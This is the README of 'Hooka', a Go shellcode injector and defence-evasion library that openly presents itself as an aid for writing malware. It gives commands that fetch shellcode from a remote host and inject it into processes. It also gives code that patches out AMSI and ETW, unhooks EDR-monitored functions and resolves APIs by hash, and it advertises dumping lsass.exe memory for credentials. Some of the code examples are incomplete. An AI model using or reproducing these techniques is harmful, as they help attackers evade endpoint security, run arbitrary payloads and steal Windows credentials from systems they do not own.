<p align="center">
  <h1 align="center">Hooka</h1>
  <p align="center">~ Shellcode injector, hooks detector and more written in Golang ~</p>
</p>

<p align="center">
  <a href="#introduction">Introduction</a> •
  <a href="#features">Features</a> •
  <a href="#usage">Usage</a> •
  <a href="#library">Library</a> •
  <a href="#contributing">Contributing</a> •
  <a href="#disclaimer">Disclaimer</a>
</p>

# Introduction

I started this project to create a powerful shellcode injector with a lot of malleable capabilities via CLI flags like detecting hooked functions, using Hells Gate technique and more. Why in Golang? Because it's a great language to develop malware and this project can help with it by providing an stable API with some functions which can be really useful.

There isn't too much info about detecting Windows hooks in ***Golang*** so I decided to try by my own. However I've also taken some code from [BananaPhone](https://github.com/C-Sto/BananaPhone) and [Doge-Gabh](https://github.com/timwhitez/Doge-Gabh) projects (thanks a lot to ***C-Sto*** and ***timwhitez***)

# Features

- Inject shellcode from remote URL or local file
- Shellcode reflective DLL injection (***sRDI***)
- ***AMSI*** and ***ETW*** patch
- Detects hooked functions (i.e. CreateRemoteThread)
- Compatible with base64 and hex encoded shellcode
- Hell's Gate technique
- Capable of unhooking functions
- Multiple shellcode injection techniques:
  - CreateRemoteThread
  - Fibers
  - OpenProcess
  - EarlyBirdAPC

- Dump lsass.exe process to a file
- Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
- Test mode (injects a calc.exe shellcode)

# Usage

Before using the project you should know that there are some functions from `ntdll.dll` that aren't usually hooked but they always appear to be hooked. Here you have all false positives:

```
NtGetTickCount
NtQuerySystemTime
NtdllDefWindowProc_A
NtdllDefWindowProc_W
NtdllDialogWndProc_A
NtdllDialogWndProc_W
ZwQuerySystemTime
```

Just clone the repository like this:

```sh
git clone https://github.com/D3Ext/Hooka
```

> Detect hooked functions by EDR (including false positives)
```sh
.\Hooka.exe --hooks
```

> Test shellcode injection by spawning a calc.exe
```sh
.\Hooka.exe --test
```

If no technique is especified it will use a random one

> Inject shellcode from URL
```sh
.\Hooka.exe -t CreateRemoteThread --url http://192.168.116.37/shellcode.bin
```

> Inject shellcode from file
```sh
.\Hooka.exe -t Fibers --file shellcode.bin
```

> Inject shellcode using Hell's Gate
```sh
.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hells
```

> Unhook function before injecting shellcode
```sh
.\Hooka.exe -t OpenProcess --file shellcode.bin --unhook
```

# Demo

> Detecting hooks
<img src="assets/hooks.png">

> Injecting shellcode via CreateRemoteThread
<img src="assets/test.png">

> Test function
<img src="assets/test.png">

> Dump lsass memory
<img src="assets/lsass.png">

# TODO

:black_square_button: Stable API for CLR functions

:black_square_button: More injection techniques

:black_square_button: Better error handling

# Library

If you're looking to implement any function in your malware you can do it using the official package API:

> First of all download the package
```sh
go get github.com/D3Ext/Hooka/pkg/hooka
```

> Detect hooked functions (including false positives)
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Returns all hooked functions
  hooks, err := hooka.DetectHooks() // func DetectHooks() ([]string, error) {}
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hooks)

  // Check if an especific function is hooked
  check, err := hooka.IsHooked("CreateRemoteThread") // func IsHooked(funcname string) (bool, error) {}
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(check) // true or false
}
```

> Resolve syscalls via API hashing
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){

  // = CreateRemoteThread
  proc, err := hooka.FuncFromHash("") // Returns a pointer to function like NewProc()
  if err != nil {
    log.Fatal(err)
  }

  proc.Call()

  ...
}
```

> Apply AMSI and ETW patch
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Amsi bypass
  err := hooka.PatchAmsi(0) // Use 0 for own process
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("AMSI bypassed!")

  // ETW bypass
  err = hooka.PatchEtw()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("ETW bypassed!")
}
```

> Unhook a function
```go
package main
```

# Contributing

Do you wanna improve the code with any idea or code optimization? You're in the right place

See [CONTRIBUTING.md](https://github.com/D3Ext/Hooka/blob/main/CONTRIBUTING.md)

# References

```
https://github.com/C-Sto/BananaPhone
https://github.com/timwhitez/Doge-Gabh
https://github.com/Ne0nd0g/go-shellcode
https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks
https://github.com/Kara-4search/HookDetection_CSharp
https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
```

# Disclaimer

Creator isn't in charge of any and has no responsibility for any kind of: illegal use of the project, malicious act, capable of causing damage to third parties

Use this project under your own responsability!

# License

This project is licensed under [MIT](https://github.com/D3Ext/Hooka/blob/main/LICENSE) license

Copyright © 2023, *D3Ext*



